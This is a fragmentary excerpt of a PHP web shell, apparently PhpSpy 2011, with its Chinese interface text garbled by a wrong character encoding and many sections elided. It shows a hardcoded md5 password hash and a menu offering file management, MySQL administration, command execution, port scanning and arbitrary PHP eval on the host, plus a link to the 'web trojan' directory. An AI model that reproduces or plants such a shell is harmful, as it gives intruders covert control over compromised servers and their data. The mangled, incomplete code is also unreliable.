...
$pass  = 'e10adc3949ba59abbe56e057f20f883e';   // md5(password)
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	...
	<tr class="alt1">
		<td>
			...
			<a href="javascript:g('logout');">ÍË³öµÇÂ½</a> | 
			<a href="javascript:g('file');">ÎÄ¼þ¹ÜÀí</a> | 
			<a href="javascript:g('mysqladmin');">MYSQL¹ÜÀí</a> | 
			<a href="javascript:g('sqlfile');">MySQLÉÏ´«ÏÂÔØ</a> | 
			<a href="javascript:g('shell');">ÃüÁîÖ´ÐÐ</a> | 
			<a href="javascript:g('phpenv');">PHP±äÁ¿</a> | 
			<a href="javascript:g('portscan');">¶Ë¿ÚÉ¨Ãè</a> | 
			<a href="javascript:g('secinfo');">°²È«ÐÅÏ¢</a> | 
			<a href="javascript:g('eval');">Eval PHP´úÂë</a>
...
<div style="background:#eee;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			...
			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Ä¿Â¼Ìø×ª" type="button"></td>
		</tr>
	</table>
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<form action="" method="post" id="godir" name="godir">
		<tr>
			<td nowrap>µ±Ç°Â·¾¶ (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
...
<?php
	...
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">ÍøÕ¾¸ùÄ¿Â¼</a>');
	p(' | <a href="javascript:godir(\'.\');">ÍøÂíÄ¿Â¼</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">ÐÂ½¨ÎÄ¼þ</a>');
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	...
	Powered by <a title="Build 20110419" href="http://t.qq.com/injecting" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2012 <a href="http://t.qq.com/injecting" target="_blank">±ù·æ´Ì¿Í</a> All Rights Reserved.
</div>
</body>
</html>
